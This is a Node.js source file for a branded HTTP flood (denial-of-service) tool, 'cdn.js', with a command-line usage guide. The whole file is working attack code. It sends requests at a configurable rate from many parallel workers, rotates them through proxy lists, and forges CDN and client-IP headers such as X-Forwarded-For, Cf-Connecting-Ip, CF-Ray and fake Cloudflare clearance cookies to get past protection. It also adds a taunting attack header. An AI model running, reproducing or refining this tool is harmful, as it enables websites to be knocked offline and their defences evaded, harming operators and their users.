// cdn.js - FULL ATTACK SCRIPT WITH IP:PORT PROXY SUPPORT
// Copyright (c) 2026 t.me/xxiinn
// MODIFIED BY ZANGXX VVIP 😈🔥

const crypto = require('crypto');
const https = require('https');
const http = require('http');
const urlModule = require('url');
const fs = require('fs');

// ============ HEADER CONFIG ============
class HeaderConfig {
    constructor() {
        this.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8";
        this.AcceptEncoding = "gzip, br";
        this.AcceptLanguage = "id-ID,id;q=0.9,en;q=0.8";
        this.CacheControl = "max-age=0";
        this.Connection = "keep-alive";
        this.Priority = "u=0, i";
        this.Referer = "https://example.com/";
        this.SecChUaArch = "x86";
        this.SecChUaBitness = "64";
        this.SecChUaMobile = "?0";
        this.SecChUaModel = "";
        this.SecChUaPlatform = "Windows";
        this.SecChUaPlatformVersion = "15.0.0";
        this.SecFetchDest = "document";
        this.SecFetchMode = "navigate";
        this.SecFetchSite = "cross-site";
        this.SecFetchUser = "?1";
        this.SecGpc = "1";
        this.UpgradeInsecureRequests = "1";
        this.XForwardedProto = "https";
        this.CFIPCountry = "";
        this.Unique = 0;
    }

    randomize(r) {
        this.UserAgent = r.getRandomUserAgent();
        this.SecChUa = r.getRandomSecChUa();
        this.SecChUaFullVersionList = r.getRandomSecChUaFull();
        this.AcceptLanguage = r.getRandomLanguage();
        this.XForwardedFor = r.getRandomIP();
        this.CFRay = r.generateCFRay();
        this.CFVisitor = r.generateCFVisitor();
        this.CfConnectingIp = r.getRandomIP();
        this.XSSLID = r.generateXSSLID();
        this.Origin = r.getRandomIP();
        this.Cookie = r.generateCookie();
        this.CFIPCountry = r.getRandomCountry();
        this.Unique = Math.floor(Math.random() * 1000000);
    }

    buildHeaders() {
        const headers = {};
        const addHeader = (key, value) => {
            if (value && value !== undefined && value !== "") {
                headers[key] = value;
            }
        };

        addHeader('Accept', this.Accept);
        addHeader('Accept-Encoding', this.AcceptEncoding);
        addHeader('Accept-Language', this.AcceptLanguage);
        addHeader('Cache-Control', this.CacheControl);
        addHeader('Connection', this.Connection);
        addHeader('Priority', this.Priority);
        addHeader('Referer', this.Referer);
        addHeader('Sec-Ch-Ua', this.SecChUa);
        addHeader('Sec-Ch-Ua-Arch', this.SecChUaArch);
        addHeader('Sec-Ch-Ua-Bitness', this.SecChUaBitness);
        addHeader('Sec-Ch-Ua-Full-Version-List', this.SecChUaFullVersionList);
        addHeader('Sec-Ch-Ua-Mobile', this.SecChUaMobile);
        addHeader('Sec-Ch-Ua-Model', this.SecChUaModel);
        addHeader('Sec-Ch-Ua-Platform', this.SecChUaPlatform);
        addHeader('Sec-Ch-Ua-Platform-Version', this.SecChUaPlatformVersion);
        addHeader('Sec-Fetch-Dest', this.SecFetchDest);
        addHeader('Sec-Fetch-Mode', this.SecFetchMode);
        addHeader('Sec-Fetch-Site', this.SecFetchSite);
        addHeader('Sec-Fetch-User', this.SecFetchUser);
        addHeader('Sec-Gpc', this.SecGpc);
        addHeader('Upgrade-Insecure-Requests', this.UpgradeInsecureRequests);
        addHeader('User-Agent', this.UserAgent);
        addHeader('X-Forwarded-For', this.XForwardedFor);
        addHeader('X-Forwarded-Proto', this.XForwardedProto);
        addHeader('Cookie', this.Cookie);
        addHeader('CF-Ray', this.CFRay);
        addHeader('CF-Visitor', this.CFVisitor);
        addHeader('Cf-Connecting-Ip', this.CfConnectingIp);
        addHeader('X-Ssl-Id', this.XSSLID);
        addHeader('Origin', this.Origin);
        addHeader('CF-IPCountry', this.CFIPCountry);
        addHeader('X-Country', this.CFIPCountry);
        addHeader('X-Xcddos-Attack', '}⁠:⁠‑⁠)Your protect is verry bad, Just go home and drink your mother\'s milkO⁠_⁠o');

        return headers;
    }

    makeRequest(targetURL, method = 'GET', body = null, proxy = null) {
        return new Promise((resolve) => {
            const parsed = urlModule.parse(targetURL);
            
            let options = {
                hostname: parsed.hostname,
                port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
                path: parsed.path || '/',
                method: method,
                headers: this.buildHeaders(),
                timeout: 10000,
                rejectUnauthorized: false
            };

            // Proxy support with IP:PORT format
            if (proxy) {
                const proxyParts = proxy.split(':');
                if (proxyParts.length === 2) {
                    const proxyHost = proxyParts[0];
                    const proxyPort = parseInt(proxyParts[1]);
                    
                    options = {
                        ...options,
                        hostname: proxyHost,
                        port: proxyPort,
                        path: targetURL,
                        headers: {
                            ...options.headers,
                            'Host': parsed.hostname,
                            'Connection': 'keep-alive'
                        }
                    };
                }
            }

            const protocol = parsed.protocol === 'https:' ? https : http;
            
            const req = protocol.request(options, (res) => {
                let data = [];
                res.on('data', (chunk) => data.push(chunk));
                res.on('end', () => {
                    resolve({
                        status: res.statusCode,
                        headers: res.headers,
                        body: Buffer.concat(data).toString()
                    });
                });
            });

            req.on('error', () => resolve({ status: 0, error: true }));
            req.on('timeout', () => {
                req.destroy();
                resolve({ status: 0, error: true });
            });

            if (body) req.write(body);
            req.end();
        });
    }
}

// ============ RANDOMIZER ============
class Randomizer {
    constructor() {
        this.userAgents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36 Edg/151.0.0.0",
        ];
        
        this.secChUaVersions = ['149', '150', '148', '151'];
        
        this.secChUaFullVersions = [
            '"Brave";v="149.0.0.0", "Chromium";v="149.0.0.0", "Not?A_Brand";v="24.0.0.0"',
            '"Brave";v="150.0.0.0", "Chromium";v="150.0.0.0", "Not?A_Brand";v="24.0.0.0"',
            '"Brave";v="148.0.0.0", "Chromium";v="148.0.0.0", "Not?A_Brand";v="24.0.0.0"',
            '"Brave";v="151.0.0.0", "Chromium";v="151.0.0.0", "Not?A_Brand";v="24.0.0.0"',
        ];
        
        this.languages = [
            "id-ID,id;q=0.9,en;q=0.8",
            "en-US,en;q=0.9,id;q=0.8",
            "en-GB,en;q=0.9",
            "id,en;q=0.9",
        ];
        
        this.ips = [
            "2a09:bac1:6560:8::279:4e",
            "2a09:bac1:6560:8::279:4f",
            "2a09:bac1:6560:8::280:4e",
            "2a09:bac1:6560:8::280:4f",
            "2a09:bac1:6560:8::281:4e",
        ];
        
        this.cfRayPrefixes = [
            "8a0a092ad9d940b0",
            "8a0a092ad9d940b1",
            "8a0a092ad9d940b2",
            "8a0a092ad9d940b3",
        ];
        
        this.cfRayLocations = ['SIN', 'JAK', 'CGK', 'LAX', 'FRA', 'LHR', 'AMS', 'SYD'];
        
        this.origins = [
            "2a09:bac1:6560:8::279:4e",
            "2a09:bac1:6560:8::279:4f",
            "2a09:bac1:6560:8::280:4e",
        ];
        
        this.countries = [
            "ID", "SG", "MY", "PH", "TH", "VN", "CN", "JP", "KR", "IN",
            "PK", "BD", "NP", "LK", "KH", "LA", "MM", "TW", "HK", "MO",
            "GB", "DE", "FR", "IT", "ES", "NL", "SE", "NO", "DK", "FI",
            "PL", "CZ", "HU", "AT", "CH", "BE", "PT", "IE", "GR", "RU",
            "US", "CA", "MX", "BR", "AR", "CL", "CO", "PE", "VE", "EC",
            "BO", "PY", "UY", "CR", "PA", "GT", "HN", "SV", "NI", "DO",
            "ZA", "NG", "EG", "KE", "MA", "DZ", "TN", "GH", "CI", "CM",
            "AU", "NZ", "FJ", "PG", "SB", "VU", "WS", "TO", "FM", "MH",
        ];
    }

    randomHex(n) {
        return crypto.randomBytes(n/2).toString('hex');
    }

    randomInt(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    getRandomElement(arr) {
        return arr[Math.floor(Math.random() * arr.length)];
    }

    generateCFRay() {
        const prefix = this.getRandomElement(this.cfRayPrefixes);
        const loc = this.getRandomElement(this.cfRayLocations);
        return `${prefix}-${loc}`;
    }

    generateCFVisitor() {
        const schemes = ['https', 'http'];
        const scheme = this.getRandomElement(schemes);
        return `{"scheme":"${scheme}"}`;
    }

    generateXSSLID() {
        const ts = Math.floor(Date.now() / 1000);
        const suffix = this.randomHex(20);
        return `${ts}-${suffix}`;
    }

    generateCookie() {
        const clearance = this.randomHex(32);
        return `_cf_clearance=${clearance}; __cf_bm=...; __cfruid=...`;
    }

    getRandomIP() {
        if (Math.random() < 0.5) {
            return `${this.randomInt(1,255)}.${this.randomInt(0,255)}.${this.randomInt(0,255)}.${this.randomInt(1,255)}`;
        }
        const parts = [];
        for (let i = 0; i < 8; i++) {
            parts.push(this.randomHex(4));
        }
        return parts.join(':');
    }

    getRandomUserAgent() {
        return this.getRandomElement(this.userAgents);
    }

    getRandomSecChUa() {
        const ver = this.getRandomElement(this.secChUaVersions);
        return `"Brave";v="${ver}", "Chromium";v="${ver}", "Not?A_Brand";v="24"`;
    }

    getRandomSecChUaFull() {
        return this.getRandomElement(this.secChUaFullVersions);
    }

    getRandomLanguage() {
        return this.getRandomElement(this.languages);
    }

    getRandomCountry() {
        return this.getRandomElement(this.countries);
    }
}

// ============ MAIN ATTACK ENGINE ============
class AttackEngine {
    constructor() {
        this.proxies = [];
        this.running = true;
        this.stats = {
            sent: 0,
            success: 0,
            failed: 0,
            startTime: Date.now()
        };
        this.proxyIndex = 0;
    }

    loadProxies(filePath) {
        try {
            const data = fs.readFileSync(filePath, 'utf8');
            this.proxies = data.split('\n')
                .map(line => line.trim())
                .filter(line => line && !line.startsWith('#') && line.includes(':'));
            
            // Bersihin format, pastiin cuma ip:port
            this.proxies = this.proxies.map(p => {
                // Kalo ada http:// atau https:// di depan, ilangin
                p = p.replace(/^https?:\/\//, '');
                // Kalo ada @, ambil bagian setelah @ (ip:port)
                if (p.includes('@')) {
                    p = p.split('@')[1];
                }
                return p;
            }).filter(p => p.split(':').length === 2);
            
            console.log(`🔥 Loaded ${this.proxies.length} proxies (IP:PORT format)`);
            return this.proxies.length > 0;
        } catch(e) {
            console.log('⚠️ No proxy file found, running without proxies');
            return false;
        }
    }

    getProxy() {
        if (this.proxies.length === 0) return null;
        const proxy = this.proxies[this.proxyIndex % this.proxies.length];
        this.proxyIndex++;
        return proxy;
    }

    async sendRequest(target, useProxy = false) {
        const r = new Randomizer();
        const header = new HeaderConfig();
        header.randomize(r);

        const proxy = useProxy ? this.getProxy() : null;
        
        try {
            const res = await header.makeRequest(target, 'GET', null, proxy);
            this.stats.sent++;
            if (res.status > 0 && res.status < 500) {
                this.stats.success++;
                return true;
            } else {
                this.stats.failed++;
                return false;
            }
        } catch(e) {
            this.stats.failed++;
            return false;
        }
    }

    async worker(target, rate, useProxy) {
        const delay = 1000 / rate;
        let lastSend = Date.now();

        while (this.running) {
            const now = Date.now();
            if (now - lastSend >= delay) {
                this.sendRequest(target, useProxy);
                lastSend = now;
            }
            await new Promise(resolve => setTimeout(resolve, 1));
        }
    }

    displayStats() {
        const elapsed = Math.floor((Date.now() - this.stats.startTime) / 1000);
        const total = this.stats.sent;
        const success = this.stats.success;
        const failed = this.stats.failed;
        const rps = elapsed > 0 ? total / elapsed : 0;

        console.log(`\r📊 [${elapsed}s] Total: ${total} | Success: ${success} | Failed: ${failed} | RPS: ${rps.toFixed(1)}`);
    }

    async start(target, duration, rate, threads, proxyFile) {
        console.log(`\n😈🔥 ZANGXX VVIP ATTACK STARTED 🔥😈`);
        console.log(`🎯 Target: ${target}`);
        console.log(`⏱️ Duration: ${duration}s`);
        console.log(`⚡ Rate: ${rate}/s`);
        console.log(`🧵 Threads: ${threads}`);
        
        const useProxy = proxyFile ? this.loadProxies(proxyFile) : false;
        
        if (useProxy) {
            console.log(`🌐 Using ${this.proxies.length} proxies (IP:PORT format)`);
        } else {
            console.log(`🌐 Running without proxies (direct connection)`);
        }
        console.log(`\n💥 ATTACK IN PROGRESS...\n`);

        // Start workers
        const workers = [];
        for (let i = 0; i < threads; i++) {
            const perThreadRate = Math.ceil(rate / threads);
            workers.push(this.worker(target, perThreadRate, useProxy));
        }

        // Stats display
        const statsInterval = setInterval(() => {
            this.displayStats();
        }, 1000);

        // Stop after duration
        setTimeout(() => {
            this.running = false;
            clearInterval(statsInterval);
            console.log('\n\n⏹️ ATTACK STOPPED');
            console.log(`\n📊 FINAL STATS:`);
            console.log(`   Total Requests: ${this.stats.sent}`);
            console.log(`   Successful: ${this.stats.success}`);
            console.log(`   Failed: ${this.stats.failed}`);
            console.log(`   Duration: ${Math.floor((Date.now() - this.stats.startTime) / 1000)}s`);
            const avgRps = (this.stats.sent / (Math.floor((Date.now() - this.stats.startTime) / 1000))).toFixed(1);
            console.log(`   Average RPS: ${avgRps}`);
            console.log(`\n🔥 ZANGXX VVIP - MISSION COMPLETE! 🔥`);
            process.exit(0);
        }, duration * 1000);

        // Wait for all workers
        await Promise.all(workers);
    }
}

// ============ PARSE ARGUMENTS ============
function parseArgs() {
    const args = process.argv.slice(2);
    
    if (args.length < 4) {
        console.log(`
😈 ZANGXX VVIP - CDN ATTACK TOOL 😈

Usage: node cdn.js <target> <duration> <rate> <threads> [proxy.txt]

Example: node cdn.js https://example.com 120 100 10 proxy.txt
         node cdn.js https://target.com 60 500 50

Parameters:
  target    - URL target (example: https://example.com)
  duration  - Attack duration in seconds
  rate      - Requests per second
  threads   - Number of parallel connections
  proxy.txt - (Optional) File containing proxy list (IP:PORT format)

Proxy format in file (IP:PORT only):
  1.2.3.4:8080
  5.6.7.8:3128
  9.10.11.12:1080
        `);
        process.exit(1);
    }

    return {
        target: args[0],
        duration: parseInt(args[1]),
        rate: parseInt(args[2]),
        threads: parseInt(args[3]),
        proxyFile: args[4] || null
    };
}

// ============ RUN ============
async function main() {
    const config = parseArgs();
    
    console.log(`
╔════════════════════════════════════════╗
║   😈 ZANGXX VVIP - CDN ATTACKER 😈    ║
║   HTTP/2 HTTP/1 MIX PROTOCOL SPOOFER  ║
╚════════════════════════════════════════╝
    `);

    const engine = new AttackEngine();
    await engine.start(
        config.target,
        config.duration,
        config.rate,
        config.threads,
        config.proxyFile
    );
}

// Handle Ctrl+C
process.on('SIGINT', () => {
    console.log('\n\n⚠️ ATTACK INTERRUPTED BY USER');
    process.exit(0);
});

if (require.main === module) {
    main();
}

module.exports = { HeaderConfig, Randomizer, AttackEngine };